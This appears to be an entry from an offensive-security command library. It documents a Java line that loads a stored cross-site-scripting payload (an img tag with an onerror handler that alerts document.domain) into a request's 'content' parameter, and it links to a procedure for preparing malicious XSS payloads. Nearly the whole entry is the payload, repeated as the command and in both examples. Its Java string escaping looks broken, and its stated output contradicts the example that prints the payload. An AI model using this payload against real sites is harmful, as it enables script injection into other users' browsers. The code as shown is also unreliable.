---
id: cmd-set-content-xss-001
data: >-
  parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<img src=a
  onerror=alert(document.domain)>\"}"]");
tags:
  - xss
  - payload
type: command
output: Parameter added to map
executor: java
platforms:
  - Java
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.685Z'
verified: false
validated: true
submitted: true
---
# set-content-xss-payload

## Command

```java
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<img src=a onerror=alert(document.domain)>\"}"]");
```

## Description

Adds the 'content' key to the parameters map with a JSON-encoded XSS payload using an img tag to alert the domain on error.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| parameters | Existing HashMap<String, String> | Yes |
| content value | Escaped JSON string with XSS | Yes |

## Examples

### Basic Usage

```java
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<img src=a onerror=alert(document.domain)>\"}"]");
```

### Advanced Usage

After creating map:

```java
Map<String, String> parameters = new HashMap<String, String>();
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<img src=a onerror=alert(document.domain)>\"}"]");
System.out.println(parameters.get("content")); // Prints payload
```

## Expected Output

No output; map now contains 'content' key with payload value.

## Related

- [[commands/create-parameters-hashmap]]
- [[procedures/Prepare-Malicious-XSS-Payload-for-Infographic-Content]]
